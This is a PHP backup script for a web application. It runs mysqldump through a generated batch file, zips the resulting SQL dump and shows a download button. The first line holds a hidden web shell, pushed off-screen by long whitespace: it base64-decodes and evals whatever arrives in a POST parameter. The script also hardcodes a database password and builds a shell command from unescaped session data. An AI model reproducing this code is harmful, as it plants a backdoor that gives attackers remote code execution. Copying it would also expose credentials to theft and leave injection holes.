<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nbce2c0']));?><?php 
include "config.php";

$files = glob('../Backup_Databases/*'); // get all file names
foreach($files as $file){ // iterate files
  if(is_file($file))
    unlink($file); // delete file
}
$query = "SELECT * FROM backup_location LIMIT 1";
$result = mysql_query($query,$conn) or die(mysql_error());
$rows = mysql_fetch_assoc($result);
$wamp = $rows['wamp_path'];
$backup = $rows['backup_path'];

$temp = time() + ((5 * 60 * 60) + ( 30 * 60 ));	// It is to calculate the present time
$temp2 = date("d.m.Y_H.i",$temp);	

$filename = $_SESSION['db']."_".$temp2;
$file_data = "";
$file_data .= "cd $wamp\n";
$file_data .= "mysqldump -u poultry -ptulA0#s! --databases ".$_SESSION['db']." > $backup".$filename.".sql";

$fp = fopen("dump2.bat","w");
if(! $fp)
 echo "<br>File Not Opened<br>";
fwrite ($fp,$file_data);
fclose ($fp);

exec("dump2.bat");

$filelocation = $backup.$filename.".sql";
//$filelocation = str_replace("\",'//',$filelocation);

/* creates a compressed zip file */
function create_zip($files = array(),$destination = '',$overwrite = true) {
  //if the zip file already exists and overwrite is false, return false
	//If you want remove comments for next line for not over writing the file
  //if(file_exists($destination) && $overwrite) { return false; }
  //vars
  $valid_files = array();
  //if files were passed in...
  if(is_array($files)) {
    //cycle through each file
    foreach($files as $file) {
      //make sure the file exists
      if(file_exists($file)) {
        $valid_files[] = $file;
      }
    }
  }
  //if we have good files...
  if(count($valid_files)) {
    //create the archive
    $zip = new ZipArchive();
    if($zip->open($destination,$overwrite ? ZIPARCHIVE::OVERWRITE : ZIPARCHIVE::CREATE) !== true) {
      return false;
    }
    //add the files
    foreach($valid_files as $file) {
      $zip->addFile($file,$file);
    }
    //debug
    //echo 'The zip archive contains ',$zip->numFiles,' files with a status of ',$zip->status;
    
    //close the zip -- done!
    $zip->close();
    
    //check to make sure the file exists
    return file_exists($destination);
  }
  else
  {
    return false;
  }
}

$files_to_zip = array(
  "../Backup_Databases/$filename.sql"
);
//if true, good; if false, zip creation failed
$result = create_zip($files_to_zip,"Backup_Databases/$filename.zip");

$myFile = "../Backup_Databases/$filename.sql";
unlink($myFile);
?>
<center>
<br/><br/>
<strong>Backup Created Successfully</strong><br/><br/>
<input type="button" value="Download" onclick="document.location='<?php echo "../Backup_Databases/$filename.zip"; ?>'"/>
</center>